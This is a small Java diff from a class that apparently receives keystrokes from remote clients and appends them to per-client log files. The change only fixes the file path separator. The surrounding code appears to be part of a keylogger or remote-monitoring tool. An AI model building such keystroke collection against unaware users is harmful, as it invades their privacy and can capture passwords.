@@ -46,7 +46,7 @@ public class ProcessGetKey implements Runnable {
                 System.out.println("Không nhận được Id client.");
                 return;
             }
-            String logFilePath = KEYBOARD_PATH + "/_" + processGetData.getCode() + "/keyboard_" + clientId + ".txt";
+            String logFilePath = KEYBOARD_PATH + "_" + processGetData.getCode() + "\\keyboard_" + clientId + ".txt";
             System.out.println("Đường dẫn lưu file " + logFilePath);
             try (FileWriter writer = new FileWriter(logFilePath, true)) {
                 String keyStroke;
